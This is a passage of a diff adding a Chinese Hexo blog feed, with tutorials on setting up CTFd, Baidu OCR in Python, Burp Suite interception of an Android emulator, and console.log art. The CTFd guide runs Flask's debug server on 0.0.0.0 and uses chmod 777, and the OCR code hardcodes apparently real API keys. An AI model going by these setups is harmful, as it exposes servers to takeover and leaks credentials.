number">125</span> <span class="token punctuation">(</span>delta <span class="token number">78</span><span class="token punctuation">)</span>, pack-reused <span class="token number">10120</span>接收对象中: <span class="token number">100</span>% <span class="token punctuation">(</span><span class="token number">10336</span>/10336<span class="token punctuation">)</span>, <span class="token number">14.90</span> MiB <span class="token operator">|</span> <span class="token number">32.00</span> KiB/s, done.处理 delta 中: <span class="token number">100</span>% <span class="token punctuation">(</span><span class="token number">6417</span>/6417<span class="token punctuation">)</span>, done.<span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment"># ls</span>CTFd<span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment">#</span><span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment"># cd CTFd/</span><span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment"># pwd</span>/usr/local/CTFd/CTFd<span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment"># </span><span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment"># ls</span>CHANGELOG.md          Dockerfile  migrations        serve.pyconf                  docs        package.json      setup.cfgCONTRIBUTING.md       export.py   populate.py       testsCTFd                  import.py   prepare.sh        Vagrantfiledevelopment.txt       LICENSE     README.md         webpack.config.jsdocker-compose.yml    Makefile    requirements.txt  wsgi.pydocker-entrypoint.sh  manage.py   scripts           yarn.lock<span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-安装CTFd"><a href="#5-安装CTFd" class="headerlink" title="5.安装CTFd"></a>5.安装CTFd</h2><p>pip install -r requirements.txt</p><pre class="line-numbers language-none"><code class="language-none">[root@localhost CTFd]# pip install -r requirements.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-启动CTFd"><a href="#6-启动CTFd" class="headerlink" title="6.启动CTFd"></a>6.启动CTFd</h2><p>在服务器中的安全组添加端口4000（放行4000端口）</p><p>然后查看serve.py 文件</p><pre class="line-numbers language-none"><code class="language-none">[root@localhost CTFd]# cat serve.py from CTFd import create_appimport argparseparser &#x3D; argparse.ArgumentParser()parser.add_argument(&quot;--port&quot;, help&#x3D;&quot;Port for debug server to listen on&quot;, default&#x3D;4000)parser.add_argument(    &quot;--profile&quot;, help&#x3D;&quot;Enable flask_profiler profiling&quot;, action&#x3D;&quot;store_true&quot;)args &#x3D; parser.parse_args()app &#x3D; create_app()if args.profile:    from flask_debugtoolbar import DebugToolbarExtension    import flask_profiler    app.config[&quot;flask_profiler&quot;] &#x3D; &#123;        &quot;enabled&quot;: app.config[&quot;DEBUG&quot;],        &quot;storage&quot;: &#123;&quot;engine&quot;: &quot;sqlite&quot;&#125;,        &quot;basicAuth&quot;: &#123;&quot;enabled&quot;: False&#125;,        &quot;ignore&quot;: [&quot;^&#x2F;themes&#x2F;.*&quot;, &quot;^&#x2F;events&quot;],    &#125;    flask_profiler.init_app(app)    app.config[&quot;DEBUG_TB_PROFILER_ENABLED&quot;] &#x3D; True    app.config[&quot;DEBUG_TB_INTERCEPT_REDIRECTS&quot;] &#x3D; False    toolbar &#x3D; DebugToolbarExtension()    toolbar.init_app(app)    print(&quot; * Flask profiling running at http:&#x2F;&#x2F;127.0.0.1:4000&#x2F;flask-profiler&#x2F;&quot;)app.run(debug&#x3D;True, threaded&#x3D;True, host&#x3D;&quot;127.0.0.1&quot;, port&#x3D;args.port)[root@localhost CTFd]#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改host为0.0.0.0（也可以修改端口4000为80这样不用在输端口，如果第一次操作建议先别修改端口等全部成功后拍摄一下快照然后在操作，这样其实出错也不至于从头开始）</p><pre class="line-numbers language-none"><code class="language-none">print(&quot; * Flask profiling running at http:&#x2F;&#x2F;0.0.0.0:4000&#x2F;flask-profiler&#x2F;&quot;)app.run(debug&#x3D;True, threaded&#x3D;True, host&#x3D;&quot;0.0.0.0&quot;, port&#x3D;args.port)[root@localhost CTFd]#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（也可以修改端口4000为80这样不用在输端口）</p><p><img src="https://i.loli.net/2020/10/26/o4VTyqPJUWA98dh.png" alt="image-20201026220202053"></p><p><img src="https://i.loli.net/2020/10/26/T4gjWKbzCRFO6Qp.png" alt="image-20201026220419071"></p><h2 id="7-启动（推荐后台启动）"><a href="#7-启动（推荐后台启动）" class="headerlink" title="7.启动（推荐后台启动）"></a>7.启动（推荐后台启动）</h2><p>pyhton3 serve.py</p><pre class="line-numbers language-none"><code class="language-none">[root@localhost CTFd]*# python3 serve.py* <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后台启动方式</p><pre class="line-numbers language-none"><code class="language-none">[root@localhost CTFd]# pwd&#x2F;usr&#x2F;local&#x2F;CTFd&#x2F;CTFd[root@localhost CTFd]# [root@localhost CTFd]# nohup python3 serve.py &amp;[1] 5614[root@localhost CTFd]# nohup: 忽略输入并把输出追加到&quot;nohup.out&quot;[root@localhost CTFd]#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-访问"><a href="#8-访问" class="headerlink" title="8.访问"></a>8.访问</h2><p>打开浏览器访问<a href="http://ip:4000">http://ip:4000</a> （服务器中的公网ip）</p><p>访问到以后可以注册</p><p>Admin Username</p><p>Admin Email</p><p>Admin Password</p><p>然后逐步Next<br>最后Finish</p><p>然后重新访问</p><p><img src="https://i.loli.net/2020/10/26/G4SWYr7FyIjpveX.png" alt="image-20201026220801141"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;p&gt;腾讯云服务器 1核1G 40GB&lt;/p&gt;
+&lt;p&gt;系统镜像 centos7.6&lt;/p&gt;
+&lt;h2 id=&quot;1-安装git&quot;&gt;&lt;a href=&quot;#
+      
+    
+    </summary>
+    
+      <category term="web安全" scheme="https://axingde.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="ctfd,centos" scheme="https://axingde.github.io/tags/ctfd-centos/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python+百度云文字识别api实现图片文字识别</title>
+    <link href="https://axingde.github.io/2020/10/21/python-%E7%99%BE%E5%BA%A6%E4%BA%91%E6%96%87%E5%AD%97%E8%AF%86%E5%88%ABapi%E5%AE%9E%E7%8E%B0%E5%9B%BE%E7%89%87%E6%96%87%E5%AD%97%E8%AF%86%E5%88%AB/"/>
+    <id>https://axingde.github.io/2020/10/21/python-百度云文字识别api实现图片文字识别/</id>
+    <published>2020-10-21T00:25:25.000Z</published>
+    <updated>2020-10-21T01:26:42.663Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>最近在浏览其他资料是无意间看见了百度云的图文识别，可以利用baidu-aip进行文字识别，感觉很AI,就更具官方资料自己动手<br>编写了一个简易的代码实现OCR</p><h2 id="1-在百度智能云创建一个应用"><a href="#1-在百度智能云创建一个应用" class="headerlink" title="1.在百度智能云创建一个应用"></a>1.在百度智能云创建一个应用</h2><p><a href="https://cloud.baidu.com/">直达百度智能云</a></p><p>有百度账号的直接登陆，没有的话需要先注册，登陆成功后点击管理控制台</p><p><img src="https://i.loli.net/2020/10/21/mldS4P3NTXCM9nc.png" alt="image-20201021083432303"></p><p>点击文字识别</p><p><img src="https://i.loli.net/2020/10/21/iIU1oq8AXLtcdR2.png" alt="image-20201021083519560"></p><p>创建应用</p><p><img src="https://i.loli.net/2020/10/21/WCcjpLUYeErSH2i.png" alt="image-20201021083608111"></p><p>应用名称和应用描述可以随意填写，然后点击确定，回到上一页面点击管理应用</p><p><img src="https://i.loli.net/2020/10/21/7niJaLKWAXEUebl.png" alt="image-20201021084008883"></p><p>其中的APPID、API key、secret Key都会在后面代码中用到</p><h2 id="2-编写代码"><a href="#2-编写代码" class="headerlink" title="2.编写代码"></a>2.编写代码</h2><p>点击技术文档，点击点击SDK文档，选择pythons语言——》快速入门</p><p><img src="https://i.loli.net/2020/10/21/6BpT5XEDecuoQH8.png" alt="image-20201021084320703"></p><p>执行前需要先安装python SDK</p><p>如果安装pip 执行 pip install baidu-aip</p><p>新建python文件代码如下：</p><pre class="line-numbers language-none"><code class="language-none">from aip import AipOcr&quot;&quot;&quot; 你的 APPID AK SK &quot;&quot;&quot;APP_ID &#x3D; &#39;你的 App ID&#39;API_KEY &#x3D; &#39;你的 Api Key&#39;SECRET_KEY &#x3D; &#39;你的 Secret Key&#39;client &#x3D; AipOcr(APP_ID, API_KEY, SECRET_KEY)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常量APP_ID在百度智能云控制台中创建，常量API_KEY与SECRET_KEY是在创建完毕应用后，系统分配给用户的，均为字符串，用于标识用户，为访问做签名验证，可在AI服务控制台中的应用列表中查看。</p><p>通用文字识别</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">&quot;&quot;&quot; 读取图片 &quot;&quot;&quot;def get_file_content(filePath):    with open(filePath, &#39;rb&#39;) as fp:        return fp.read()image &#x3D; get_file_content(&#39;example.jpg&#39;)&quot;&quot;&quot; 调用通用文字识别, 图片参数为本地图片 &quot;&quot;&quot;client.basicGeneral(image);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中get_file_content中的expample.jpg是你所要识别完整图片所在的位置</p><p>完整代码：</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: UTF-8 -*-from aip import AipOcrimport reAPP_ID &#x3D; &#39;22846287&#39;API_KEY &#x3D; &#39;bHiBeiNHr38qXECDyYeefo76&#39;SECRET_KEY &#x3D; &#39;6mB4Gf4oZCStaPLlpZot5y1fYwdl8Tl5&#39;client &#x3D; AipOcr(APP_ID, API_KEY, SECRET_KEY)def get_file_content(filePath):    with open(filePath, &#39;rb&#39;) as fp:        return fp.read()image &#x3D; get_file_content(&#39;ali.png&#39;)res &#x3D; client.general(image)for item in res[&#39;words_result&#39;]:    print item[&#39;words&#39;]    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>识别效果：</p><p><img src="https://i.loli.net/2020/10/21/Lp3wWHsRQhBn8j7.png" alt="image-20201021091436632"></p><p>此代码比较简单主要只是一个简单介绍，你可以添加文档中的参数来实现具体要求和更加完善的图文识别。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;简介：&quot;&gt;&lt;a href=&quot;#简介：&quot; class=&quot;headerlink&quot; title=&quot;简介：&quot;&gt;&lt;/a&gt;简介：&lt;/h2&gt;&lt;p&gt;最近在浏览其他资料是无意间看见了百度云的图文识别，可以利用baidu-aip进行文字识别，感觉很AI,就更具官方资料自己动手&lt;br&gt;
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://axingde.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="python,百度云，OCR" scheme="https://axingde.github.io/tags/python-%E7%99%BE%E5%BA%A6%E4%BA%91%EF%BC%8COCR/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>利用bp抓取安卓模拟器的请求包</title>
+    <link href="https://axingde.github.io/2020/10/19/%E5%88%A9%E7%94%A8bp%E6%8A%93%E5%8F%96%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%9A%84%E8%AF%B7%E6%B1%82%E5%8C%85/"/>
+    <id>https://axingde.github.io/2020/10/19/利用bp抓取安卓模拟器的请求包/</id>
+    <published>2020-10-19T09:06:58.000Z</published>
+    <updated>2020-10-19T09:36:19.231Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>环境：逍遥安卓模拟器7.2.8，burpsuite2.1(实验中简称“BP”)</p><h2 id="1-设置抓取http请求包"><a href="#1-设置抓取http请求包" class="headerlink" title="1.设置抓取http请求包"></a>1.设置抓取http请求包</h2><p>要想抓取到安卓模拟器请求包，跟在真实手机上设置大相径庭，只不过就是设置抓HTTPS的地方稍微有点不同。第一步，需要查看自己电脑上的IP，以及在BP上设置代理。</p><p><img src="https://i.loli.net/2020/10/19/l2X8K1hUYwZtTuQ.png" alt="image-20201019171514422"></p><p>我的电脑使用的时wifi连接，查看后得到本机IP为10.200.145.238，BP上Proxy模块的Option上设置代理IP和端口分别为：10.200.145.238:8080</p><p><img src="https://i.loli.net/2020/10/19/ofCKOiDXSUzTYHm.png" alt="image-20201019171843641"></p><p>接下来就是在模拟器上设置WiFi的代理。在模拟器上WiFi设置中，把鼠标移至连接的WiFi上，长按左键，进入修改网络界面。</p><p><img src="https://i.loli.net/2020/10/19/bnJIUeiDM5yQozA.png" alt="image-20201019171950620"></p><p>进入高级选项，设置代理IP和端口分别为10.200.145.238和8080。</p><p><img src="https://i.loli.net/2020/10/19/seOS7nFCgVQzcLZ.png" alt="image-20201019172100987"></p><p>保存好以后，在模拟器中使用浏览器,（访问<a href="https://www.baidu.com，可在BP上抓到包。">https://www.baidu.com，可在BP上抓到包。</a></p><p><img src="https://i.loli.net/2020/10/19/TdP4tv8KbXO7syx.png" alt="image-20201019172255940"></p><p>虽然可以抓到HTTP的请求包，但是页面一直在报证书有问题。（在实际手机上是抓不到HTTPS包的，因为需要证书的配置）。</p><p><img src="https://i.loli.net/2020/10/19/wtqvPzDTKE9heVs.png" alt="image-20201019172403075"></p><h2 id="2-设置抓取https的数据包"><a href="#2-设置抓取https的数据包" class="headerlink" title="2.设置抓取https的数据包"></a>2.设置抓取https的数据包</h2><p>在模拟器中浏览器上访问<a href="http://10.200.145.238:8080(代理地址),点击如图所示位置下载CA证书。">http://10.200.145.238:8080(代理地址),点击如图所示位置下载CA证书。</a></p><p><img src="https://i.loli.net/2020/10/19/K4vPmtxNeakOfVb.png" alt="image-20201019172557970"></p><p>接下来便是安装了，打来安卓模拟器左边的共享，进入到下载目录。</p><p><img src="https://i.loli.net/2020/10/19/LK5EaWovZ9yJqkO.png" alt="image-20201019172636596"></p><p>可看到刚下载的CA证书。(文件格式把.der改为.cer)</p><p><img src="https://i.loli.net/2020/10/19/cDrsyhVJ4fW1CpX.png" alt="image-20201019172739805"></p><p>接下来进行安装，点击设置——》安全——》从SD卡安装证书——》选中刚刚下载的CA证书——》取个名字点击确定</p><p><img src="https://i.loli.net/2020/10/19/noS2XLuIsWdQ4Nm.png" alt="image-20201019173151550"></p><p><img src="https://i.loli.net/2020/10/19/TalPcKXdENUCBSx.png" alt="image-20201019173221924"></p><p> 可能需要设置密码，设置密码就好了，然后重新在模拟器上用浏览器上访问<a href="https://www.baidu.com，用burpsuit抓包。不再报错且能正常抓到包。">https://www.baidu.com，用burpsuit抓包。不再报错且能正常抓到包。</a></p><p><img src="https://i.loli.net/2020/10/19/tBE1NnTReGr3vks.png" alt="image-20201019173343548"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;p&gt;环境：逍遥安卓模拟器7.2.8，burpsuite2.1(实验中简称“BP”)&lt;/p&gt;
+&lt;h2 id=&quot;1-设置抓取http请求包&quot;&gt;&lt;a 
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://axingde.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="burpsuite,安卓模拟器" scheme="https://axingde.github.io/tags/burpsuite-%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu搭建CTFd平台</title>
+    <link href="https://axingde.github.io/2020/10/16/Ubuntu%E6%90%AD%E5%BB%BACTFd%E5%B9%B3%E5%8F%B0/"/>
+    <id>https://axingde.github.io/2020/10/16/Ubuntu搭建CTFd平台/</id>
+    <published>2020-10-16T13:15:05.000Z</published>
+    <updated>2020-10-16T14:06:39.039Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>本次实验的环境如下：</p><p>Ubuntu18.04.5</p><p>原本安装ubuntu使用的是版本是18.10但是出现各种各样的问题，最后改用18.04.5版本</p><h2 id="1-首先搭建安装Ubuntu环境"><a href="#1-首先搭建安装Ubuntu环境" class="headerlink" title="1.首先搭建安装Ubuntu环境"></a>1.首先搭建安装Ubuntu环境</h2><p>ubuntu下载：<a href="https://ubuntu.com/download/desktop">https://ubuntu.com/download/desktop</a></p><p>或 <a href="https://developer.aliyun.com/mirror/?spm=5176.13910061.1173276.2.54d27c6dDf8kgG">https://developer.aliyun.com/mirror/?spm=5176.13910061.1173276.2.54d27c6dDf8kgG</a></p><p>可参考此教程：<a href="https://blog.csdn.net/qq_31939617/article/details/100114546">https://blog.csdn.net/qq_31939617/article/details/100114546</a></p><h2 id="2-在安装CTFd需要先更换源"><a href="#2-在安装CTFd需要先更换源" class="headerlink" title="2.在安装CTFd需要先更换源"></a>2.在安装CTFd需要先更换源</h2><p>编辑源文件：</p><pre class="line-numbers language-none"><code class="language-none">sudo gedit &#x2F;etc&#x2F;apt&#x2F;sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把里面的内容全部替换下面的源：</p><pre class="line-numbers language-none"><code class="language-none">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以参考此链接下面的别的源</p><p><a href="https://developer.aliyun.com/mirror/ubuntu?spm=a2c6h.13651102.0.0.29911b118PBFmm">https://developer.aliyun.com/mirror/ubuntu?spm=a2c6h.13651102.0.0.29911b118PBFmm</a></p><p>或者百度搜索ubuntu更换国内源</p><p>更换过后保存，如无法保存使用命令</p><pre class="line-numbers language-none"><code class="language-none">sudo chmod 777 &#x2F;etc&#x2F;apt&#x2F;sources.list <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使文件可编辑</p><h2 id="3-更新源（重中之重）"><a href="#3-更新源（重中之重）" class="headerlink" title="3.更新源（重中之重）"></a>3.更新源（重中之重）</h2><pre class="line-numbers language-none"><code class="language-none">sudo apt-get upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-安装git"><a href="#4-安装git" class="headerlink" title="4.安装git"></a>4.安装git</h2><pre class="line-numbers language-none"><code class="language-none">sudo apt install git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-安装pip"><a href="#5-安装pip" class="headerlink" title="5.安装pip"></a>5.安装pip</h2><p>先查看python版本，直接在终端窗口输入python查看，使用exit()推出</p><p>使用命令安装pip</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install python3-pip(我的python环境使python3)如是安装时出现错误：Traceback (most recent call last): 或者time out 需要更换pip镜像源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-1更换pip镜像源"><a href="#5-1更换pip镜像源" class="headerlink" title="5.1更换pip镜像源"></a>5.1更换pip镜像源</h3><p>若首次更换,则创建pip.conf文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> ~/.pip<span class="token builtin class-name">cd</span> ~/.pip<span class="token function">touch</span> pip.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>编辑pip.conf文件:</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo gedit ~&#x2F;.pip&#x2F;pip.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开pip.conf文件窗口,将以下内容复制到文件中:</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[global]index-url &#x3D; http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple[install]trusted-host&#x3D;pypi.douban.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-安装Flask或flask"><a href="#6-安装Flask或flask" class="headerlink" title="6.安装Flask或flask"></a>6.安装Flask或flask</h2><pre class="line-numbers language-none"><code class="language-none">sudo pip install Flask 或 sudo pip install flask(使用的是Flask中的flask实验安装的是flask)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ps:</p><h2 id="7-克隆CTFd"><a href="#7-克隆CTFd" class="headerlink" title="7.克隆CTFd"></a>7.克隆CTFd</h2><pre class="line-numbers language-none"><code class="language-none">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;CTFd&#x2F;CTFd.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-安装CTFd"><a href="#8-安装CTFd" class="headerlink" title="8.安装CTFd"></a>8.安装CTFd</h2><pre class="line-numbers language-none"><code class="language-none">cd CTFdsudo pip3 install -r requirements.txtsudo python3 .&#x2F;serve.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后浏览器输入 127.0.0.1:4000 查看</p><h2 id="9-安装gunicorn让CTFd可以用ip访问"><a href="#9-安装gunicorn让CTFd可以用ip访问" class="headerlink" title="9.安装gunicorn让CTFd可以用ip访问"></a>9.安装gunicorn让CTFd可以用ip访问</h2><pre class="line-numbers language-none"><code class="language-none">cd CTFdsudo pip3 install gunicorngunicorn --bind 0.0.0.0:8000 -w 20 &quot;CTFd.create_app()&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后查看ubuntu的IP地址</p><pre class="line-numbers language-none"><code class="language-none">ifconfig -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示</p><pre class="line-numbers language-none"><code class="language-none">Command &#39;ifconfig&#39; not found, but can be installed with:sudo apt install net-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用命令安装</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install net-tools<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次使用</p><pre class="line-numbers language-none"><code class="language-none">ifconfig -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 查看</p><p>输入 本机ip:8000</p><h2 id="10-安装参考"><a href="#10-安装参考" class="headerlink" title="10.安装参考"></a>10.安装参考</h2><p>视频安装可以看这两位师傅的：</p><p><a href="https://www.bilibili.com/video/BV1sv411B7U4?t=722">https://www.bilibili.com/video/BV1sv411B7U4?t=722</a></p><p><a href="https://www.bilibili.com/video/BV1TW411m7ts?t=523">https://www.bilibili.com/video/BV1TW411m7ts?t=523</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;p&gt;本次实验的环境如下：&lt;/p&gt;
+&lt;p&gt;Ubuntu18.04.5&lt;/p&gt;
+&lt;p&gt;原本安装ubuntu使用的是版本是18.10但是出现各种各样的
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://axingde.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="CTFd,Ubuntu" scheme="https://axingde.github.io/tags/CTFd-Ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>控制台输出图形</title>
+    <link href="https://axingde.github.io/2020/10/15/%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E5%9B%BE%E5%BD%A2/"/>
+    <id>https://axingde.github.io/2020/10/15/控制台输出图形/</id>
+    <published>2020-10-15T06:43:40.000Z</published>
+    <updated>2020-10-15T07:23:41.416Z</updated>
+    
+    <content type="html"><![CDATA[<p>在浏览b站的时候打开控制台发现了有B站的logo，感觉很酷炫就寻找资料研究</p><p><img src="https://i.loli.net/2020/10/15/nlbyX9DN2r5wxPq.png" alt="image-20201015144648036"></p><p>感觉很酷炫就寻找资料研究，方法是使用console.log()，</p><p>定义和用法<br>console.log() 方法用于在控制台输出信息。</p><p>该方法对于开发过程进行测试很有帮助。</p><p>提示: 在测试该方法的过程中，控制台需要可见 (浏览器按下 F12 打开控制台)。</p><p>现在我们开始制作自己的：</p><!-- 控制台Console美化 --><script>console.log("%c%c博客名称%cstar小浣熊","line-height:28px;","line-height:28px;padding:4px;background:#222;color:#fff;font-size:16px;margin-right:15px","color:#3fa9f5;line-height:28px;font-size:16px;");console.log("%c%c网站地址%chttp://www.axingstar.xyz","line-height:28px;","line-height:28px;padding:4px;background:#222;color:#fff;font-size:16px;margin-right:15px","color:#ff9900;line-height:28px;font-size:16px;");</script><p>console打印的文字是可以添加样式的，不过不是全部css效果都有效，这里只介绍一小部分样式。</p><p>是换行，可以将一个字符串设置成多行</p><p>%c标记之后的内容使用对应样式，格式如 console.log(’%c第一个样式%c第二个样式’,’css1’,’css2’); 如此对应</p><p>样式和普通的css效果基本一致，可以设置文字颜色，背景颜色，字体大小，间距，边距等等。还支持部分css3高级效果。</p><p>本地效果演示：</p><p>把代码放到一个文本中另存为html文件，浏览器打开控制台看到效果：</p><p><img src="https://i.loli.net/2020/10/15/FE3TgsJtbQnM7Y4.png" alt="image-20201015145700753"></p><p>也可以使用定制banner的网站制作图形</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;patorjk.com&#x2F;software&#x2F;taaghttp:&#x2F;&#x2F;www.network-science.de&#x2F;ascii&#x2F;http:&#x2F;&#x2F;www.degraeve.com&#x2F;img2txt.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把生成的字符复制到notepad++</p><p>先设置notepadd++视图</p><p><img src="https://i.loli.net/2020/10/15/pDMYVmREfZ1KhJH.png" alt="image-20201015151405897"></p><p>然后替换一些内容</p><p><img src="https://i.loli.net/2020/10/15/GJPZoWaRBTqXOyV.png" alt="image-20201015151604563"></p><p>然后再把aA(这个只是过度，可以随意)在替换成\n</p><p><img src="https://i.loli.net/2020/10/15/2ctegkNKRi7TJOy.png" alt="image-20201015151733007"></p><p>把这内容放在console.log()中</p><script>console.log("              .__                \n_____  ___  __|__| ____    ____  \n\__  \ \  \/  /  |/    \  / ___\ \n / __ \_>    <|  |   |  \/ /_/  >\n(____  /__/\_ \__|___|  /\___  / \n     \/      \/       \//_____/ ")</script><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>效果演示：</p><p><img src="https://i.loli.net/2020/10/15/wOixRJo2QGkmp93.png" alt="image-20201015152029076"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;在浏览b站的时候打开控制台发现了有B站的logo，感觉很酷炫就寻找资料研究&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/10/15/nlbyX9DN2r5wxPq.png&quot; alt=&quot;image-20201015144648036&quot;&gt;&lt;
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://axingde.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="控制台输出图形" scheme="https://axingde.github.io/tags/%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E5%9B%BE%E5%BD%A2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python学习笔记</title>
